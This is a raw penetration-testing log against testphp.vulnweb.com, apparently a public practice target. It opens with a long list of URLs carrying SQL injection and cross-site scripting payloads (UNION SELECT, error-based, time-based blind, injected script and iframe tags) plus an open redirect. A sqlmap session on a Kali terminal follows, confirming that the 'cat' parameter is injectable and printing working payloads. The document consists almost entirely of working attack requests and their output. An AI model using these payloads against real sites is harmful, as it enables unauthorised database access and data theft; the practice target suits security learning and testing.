http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe%20src%3d%22%2f%2fmv9e8mbvffalfsrxrjwetv5xhynulh9krdrtzndh23g%26%2346%3br87%26%2346%3bme%22%3E%3C%2fiframe%3E
http://testphp.vulnweb.com/listproducts.php?cat=-1%E2%80%99%EF%80%A0
http://testphp.vulnweb.com/?%3Fid=1%20ORDER%20BY%201--%20mjAa
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176716271%2C%28SELECT%20%28ELT%287698%3D7698%2C1%29%29%29%2C0x716b786b71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29
http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+pass+from+users+limit+0,1
http://testphp.vulnweb.com/redir.php?r=https://mind.brain.harvard.edu/slot-online12/?id=58456
http://testphp.vulnweb.com/listproducts.php?cat=%22%20or%20
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11;
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1921
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20MD5%28NULL~NULL%29%29%20IS%20NULL%20AND%20%281695%3D1695&user=2
http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+uname+from+users+limit+0,1
http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%A2%D8%B9%D9%90%D9%82%D9%88%D9%85%D9%84%D8%A7%7Ctestphp.vulnweb.com%E2%80%A2%D8%B1%D9%8A%D8%BA%D8%AA%D9%8C%D9%85%D9%84%D8%A7
http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fff...
http://testphp.vulnweb.com/login.php?id=4851
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7
http://testphp.vulnweb.com:80/index.php%20cat=1
http://testphp.vulnweb.com/index.php?id=%252%25%20AND%203613%3D3613&user=1
http://testphp.vulnweb.com/listproducts.php?cat=z
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133
http://testphp.vulnweb.com/listproducts.php?cat=1+and+(SELECT+1+from+users+limit+0,1
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,EVENT_CATALOG+from+information_schema.EVENTS
http://testphp.vulnweb.com/listproducts.php?cat=FUZZ&artist=FUZZ
http://testphp.vulnweb.com/?%3Fid=1%2F%2A!50000AND%2A%2F1=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%20AND%206311%3D6311%20AND%20%27zdnL%27%3D%27zdnL
http://testphp.vulnweb.com/login.php?id=1%2C%22%29.%28.%29.%27%29
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%289432%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x494b4a4f%29%29%29%29%29%2C1%29--%20ySPZ
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%207017%3D7017%20AND%20%281438%3D1438
http://testphp.vulnweb.com:80/comment.php?pid=5
http://testphp.vulnweb.com/?%3Fid=1%27%29%28%28%28%29..%29%22
http://testphp.vulnweb.com/?%3Fid=1%20AND%204207%3D4207
http://testphp.vulnweb.com/?%3Fid=1%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27CKQE%27%3D%27CKQE
http://testphp.vulnweb.com/listproducts.php?cat=1%20OR%2017-7%3d10CONFIRMED
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20hRBO&user=2
http://testphp.vulnweb.com/listproducts.php?cat=1+and+ascii
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%203726%3D3033%20AND%20%28%27dGrV%27%3D%27dGrV
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7162787a71%2C%28SELECT%20%28ELT%284438%3D4438%2C1%29%29%29%2C0x716b7a6271%29%29%20USING%20utf8%29%29%29--%20oGjQ
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20UPDATEXML%283477%2CCONCAT%280x2e%2C0x7176716271%2C%28SELECT%20%28ELT%283477%3D3477%2C1%29%29%29%2C0x716b786b71%29%2C6541%29
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9
http://testphp.vulnweb.com/?%3Fid=1.%28%27.%22%2C%2C%28%2C%29
http://testphp.vulnweb.com/?%3Fid=1%20AND%204786%3D%28SELECT%204786%20FROM%20PG_SLEEP%285%29%29--%20DyKk
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165Skipped-NR--NR-
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20%28NULL%20SETEQ%20NULL%29%29%20IS%20NULL%20AND%20%286941%3D6941&user=2
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%204786%3D%28SELECT%204786%20FROM%20PG_SLEEP%285%29%29%20AND%20%27AbLW%27%3D%27AbLW
http://testphp.vulnweb.com/categories.php/listproducts.php?cat=%27
http://testphp.vulnweb.com/listproducts.php?cat=1%D8%B7%D8%A8%D8%A7%D8%B1%D9%84%D8%A7%D8%A8
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en12.http://www.try2hack.nl/13.http://vicnum.ciphertechs.com/
http://testphp.vulnweb.com/?%3Fid=1%20ORDER%20BY%206028--%20siap
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20ORDER%20BY%204472--%20vxpV&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%22..%2C%27.%29%29%29%2C
http://testphp.vulnweb.com/listproducts.php?cat=1+and+(SELECT+1+from+admin+limit+0,1
http://testphp.vulnweb.com/?%3Fid=1%20--
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286520%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x75556a6d%29%29%29%29%29%2C1%29%23
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27qQrErS%3C%27%22%3EqhDCPc
http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+3--+
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%202688%3D2688%20AND%20%285891%3D5891
http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%201=1%20UNION%20ALL%20SELECT%201,2,3,4%20from%20information_schema.tables--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20EXTRACTVALUE%287907%2CCONCAT%280x5c%2C0x7178706a71%2C%28SELECT%20%28ELT%287907%3D7907%2C1%29%29%29%2C0x71706b6a71%29%29--%20qXvX
http://testphp.vulnweb.com/listproducts.php?cat=999999.9
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%2C%2C%2C%29%28%22%27%2C%29%28
http://testphp.vulnweb.com/index.php?%25id%25=1%27GWsMmx%3C%27%22%3EzgMYBb&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%206031%3DBENCHMARK%285000000%2CMD5%280x5a554e6a%29%29--%20mkzI
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%201574%3D7678%20AND%20%286072%3D6072
http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,2,3,4,5,6,7,8,9,10,version(
http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,2,3,4,5,6,7,8,9,10,11
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=13
http://testphp.vulnweb.com/listproducts.php?cat=123'
http://testphp.vulnweb.com/listproducts.php?cat=1%27%20ORDER%20BY%201--%20-
http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+5--+
http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,11+--
http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,group_concat(column_name
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1.%28%29%28%2C%22..%2C%27
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(CHARACTER_SET_NAME,0x3a
http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&zfdfasdf=124fffff
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+12--+
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/tooltesting/output/testphp.vulnweb.com_20251030_004430]
└─$ 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/tooltesting/output/testphp.vulnweb.com_20251030_004430]
└─$ sqlmap -u http://testphp.vulnweb.com:80/listproducts.php?cat=                
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___[(]_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                                   
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                  
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:53:44 /2025-10-30/

[00:53:44] [WARNING] provided value for parameter 'cat' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[00:53:44] [INFO] testing connection to the target URL
[00:53:45] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
[00:53:45] [INFO] checking if the target is protected by some kind of WAF/IPS
[00:53:45] [INFO] testing if the target URL content is stable
[00:53:45] [INFO] target URL content is stable
[00:53:45] [INFO] testing if GET parameter 'cat' is dynamic
[00:53:46] [INFO] GET parameter 'cat' appears to be dynamic
[00:53:46] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
[00:53:46] [INFO] testing for SQL injection on GET parameter 'cat'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[00:53:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:53:57] [WARNING] reflective value(s) found and filtering out
[00:54:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[00:54:02] [INFO] testing 'Generic inline queries'
[00:54:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[00:54:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[00:54:26] [INFO] GET parameter 'cat' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="sem")
[00:54:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[00:54:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[00:54:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[00:54:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[00:54:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[00:54:27] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[00:54:28] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[00:54:28] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[00:54:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:54:29] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:54:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:54:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:54:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:54:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:54:31] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:54:31] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[00:54:32] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[00:54:32] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[00:54:32] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[00:54:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[00:54:33] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[00:54:33] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' injectable 
[00:54:33] [INFO] testing 'MySQL inline queries'
[00:54:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[00:54:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[00:54:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[00:54:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[00:54:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[00:54:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[00:54:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:54:37] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[00:54:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[00:54:37] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[00:54:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[00:54:38] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[00:54:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[00:54:39] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[00:54:39] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[00:54:40] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[00:54:40] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[00:54:41] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[00:54:41] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[00:54:41] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[00:54:42] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[00:54:42] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[00:54:42] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[00:54:43] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[00:54:43] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[00:54:44] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[00:54:44] [INFO] testing 'MySQL AND time-based blind (ELT)'
[00:54:44] [INFO] testing 'MySQL OR time-based blind (ELT)'
[00:54:45] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[00:54:45] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[00:54:45] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[00:54:46] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[00:54:46] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[00:54:50] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[00:54:51] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[00:54:51] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[00:54:52] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[00:54:52] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[00:54:52] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[00:54:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:54:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:55:01] [INFO] target URL appears to be UNION injectable with 1 columns
[00:55:03] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[00:55:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[00:55:11] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[00:55:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:55:14] [INFO] target URL appears to have 11 columns in query
[00:55:23] [INFO] GET parameter 'cat' is 'MySQL UNION query (random number) - 1 to 20 columns' injectable
[00:55:23] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 218 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: cat=-2691 OR 3060=3060#

    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: cat=GTID_SUBSET(CONCAT(0x717a717a71,(SELECT (ELT(2448=2448,1))),0x7162627a71),2448)

    Type: UNION query
    Title: MySQL UNION query (random number) - 11 columns
    Payload: cat=-5716 UNION ALL SELECT 6796,6796,6796,6796,6796,6796,CONCAT(0x717a717a71,0x4c61786d764a5352474751796f6d49766877746e53494e47476a5849787350596265517142646d47,0x7162627a71),6796,6796,6796,6796#
---
[00:55:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6
[00:55:45] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'

[*] ending @ 00:55:45 /2025-10-30/

                                                                                                                                                                                                                                          
 
